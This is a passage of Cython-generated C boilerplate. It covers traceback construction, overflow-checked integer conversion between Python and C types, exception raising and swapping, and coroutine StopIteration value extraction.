    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            
        py_code,           
        __pyx_d,    
        0                  
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}


#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }


static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}


static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}


static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}


#if PY_MAJOR_VERSION < 3
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb,
                        CYTHON_UNUSED PyObject *cause) {
    __Pyx_PyThreadState_declare
    Py_XINCREF(type);
    if (!value || value == Py_None)
        value = NULL;
    else
        Py_INCREF(value);
    if (!tb || tb == Py_None)
        tb = NULL;
    else {
        Py_INCREF(tb);
        if (!PyTraceBack_Check(tb)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: arg 3 must be a traceback or None");
            goto raise_error;
        }
    }
    if (PyType_Check(type)) {
#if CYTHON_COMPILING_IN_PYPY
        if (!value) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#endif
        PyErr_NormalizeException(&type, &value, &tb);
    } else {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto raise_error;
        }
        value = type;
        type = (PyObject*) Py_TYPE(type);
        Py_INCREF(type);
        if (!PyType_IsSubtype((PyTypeObject *)type, (PyTypeObject *)PyExc_BaseException)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: exception class must be a subclass of BaseException");
            goto raise_error;
        }
    }
    __Pyx_PyThreadState_assign
    __Pyx_ErrRestore(type, value, tb);
    return;
raise_error:
    Py_XDECREF(value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
    return;
}
#else
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause) {
    PyObject* owned_instance = NULL;
    if (tb == Py_None) {
        tb = 0;
    } else if (tb && !PyTraceBack_Check(tb)) {
        PyErr_SetString(PyExc_TypeError,
            "raise: arg 3 must be a traceback or None");
        goto bad;
    }
    if (value == Py_None)
        value = 0;
    if (PyExceptionInstance_Check(type)) {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto bad;
        }
        value = type;
        type = (PyObject*) Py_TYPE(value);
    } else if (PyExceptionClass_Check(type)) {
        PyObject *instance_class = NULL;
        if (value && PyExceptionInstance_Check(value)) {
            instance_class = (PyObject*) Py_TYPE(value);
            if (instance_class != type) {
                int is_subclass = PyObject_IsSubclass(instance_class, type);
                if (!is_subclass) {
                    instance_class = NULL;
                } else if (unlikely(is_subclass == -1)) {
                    goto bad;
                } else {
                    type = instance_class;
                }
            }
        }
        if (!instance_class) {
            PyObject *args;
            if (!value)
                args = PyTuple_New(0);
            else if (PyTuple_Check(value)) {
                Py_INCREF(value);
                args = value;
            } else
                args = PyTuple_Pack(1, value);
            if (!args)
                goto bad;
            owned_instance = PyObject_Call(type, args, NULL);
            Py_DECREF(args);
            if (!owned_instance)
                goto bad;
            value = owned_instance;
            if (!PyExceptionInstance_Check(value)) {
                PyErr_Format(PyExc_TypeError,
                             "calling %R should have returned an instance of "
                             "BaseException, not %R",
                             type, Py_TYPE(value));
                goto bad;
            }
        }
    } else {
        PyErr_SetString(PyExc_TypeError,
            "raise: exception class must be a subclass of BaseException");
        goto bad;
    }
    if (cause) {
        PyObject *fixed_cause;
        if (cause == Py_None) {
            fixed_cause = NULL;
        } else if (PyExceptionClass_Check(cause)) {
            fixed_cause = PyObject_CallObject(cause, NULL);
            if (fixed_cause == NULL)
                goto bad;
        } else if (PyExceptionInstance_Check(cause)) {
            fixed_cause = cause;
            Py_INCREF(fixed_cause);
        } else {
            PyErr_SetString(PyExc_TypeError,
                            "exception causes must derive from "
                            "BaseException");
            goto bad;
        }
        PyException_SetCause(value, fixed_cause);
    }
    PyErr_SetObject(type, value);
    if (tb) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject *tmp_type, *tmp_value, *tmp_tb;
        PyErr_Fetch(&tmp_type, &tmp_value, &tmp_tb);
        Py_INCREF(tb);
        PyErr_Restore(tmp_type, tmp_value, tb);
        Py_XDECREF(tmp_tb);
#else
        PyThreadState *tstate = __Pyx_PyThreadState_Current;
        PyObject* tmp_tb = tstate->curexc_traceback;
        if (tb != tmp_tb) {
            Py_INCREF(tb);
            tstate->curexc_traceback = tb;
            Py_XDECREF(tmp_tb);
        }
#endif
    }
bad:
    Py_XDECREF(owned_instance);
    return;
}
#endif


#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
    #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif


#include <structmember.h>
#include <frameobject.h>
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
#define __Pyx_Coroutine_Undelegate(gen) Py_CLEAR((gen)->yieldfrom)
static int __Pyx_PyGen__FetchStopIterationValue(CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject **pvalue) {
    PyObject *et, *ev, *tb;
    PyObject *value = NULL;
    __Pyx_ErrFetch(&et, &ev, &tb);
    if (!et) {
        Py_XDECREF(tb);
        Py_XDECREF(ev);
        Py_INCREF(Py_None);
        *pvalue = Py_None;
        return 0;
    }
    if (likely(et == PyExc_StopIteration)) {
        if (!ev) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#if PY_VERSION_HEX >= 0x030300A0
        else if (Py_TYPE(ev) == (PyTypeObject*)PyExc_StopIteration) {
            value = ((PyStopIterationObject *)ev)->value;
            Py_INCREF(value);
            Py_DECREF(ev);
        }
#endif
        else if (unlikely(PyTuple_Check(ev))) {
            if (PyTuple_GET_SIZE(ev) >= 1) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                value = PyTuple_GET_ITEM(ev, 0);
                Py_INCREF(value);
#else
                value = PySequence_ITEM(ev, 0);
#endif
            } else {
                Py_INCREF(Py_None);
                value = Py_None;
            }
            Py_DECREF(ev);
        }
        else if (!__Pyx_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration)) {
            value = ev;
        }
        if (likely(value)) {
            Py_XDECREF(tb);
            Py_DECREF(et);
            *pvalue = value;
            return 0;
        }
    } else if (!__Pyx_PyErr_GivenExceptionMatches(et, PyExc_StopIteration)) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    PyErr_NormalizeException(&et, &ev, &tb);
    if (unlikely(!PyObject_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration))) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    Py_XDECREF(tb);
    Py_DECREF(et);
#if PY_VERSION_HEX >= 0x030300A0
    value = ((PyStopIterationObject *)ev)->value;
    Py_INCREF(value);
    Py_DECREF(ev);
#else
    {
        PyObject* args = __Pyx_PyObject_GetAttrStr(ev, __pyx_n_s_args);
        Py_DECREF(ev);
        if (likely(args)) {
            value = PySequence_GetItem(args, 0);
            Py_DECREF(args);
        }
        if (unlikely(!value)) {
            __Pyx_ErrRestore(NULL, NULL, NULL);
            Py_INCREF(Py_None);
            value = Py_None;
        }
    }
#endif
    *pvalue = value;
    return 0;
}
static CYTHON_INLINE
void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *exc_state) {
    PyObject *t, *v, *tb;
    t = exc_state->exc_type;
    v = exc_state->exc_value;
    tb = exc_state->exc_traceback;
    exc_state->exc_type = NULL;
    exc_state->exc_value = NULL;
    exc_state->exc_traceback = NULL;
    Py_XDECREF(t);
    Py_XDECREF(v);
    Py_XDECREF(tb);
}
#define __Pyx_Coroutine_AlreadyRunningError(gen)  (__Pyx__Coroutine_AlreadyRunningError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyRunningError(CYTHON_UNUSED __pyx_CoroutineObject *gen) {
    const char *msg;
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
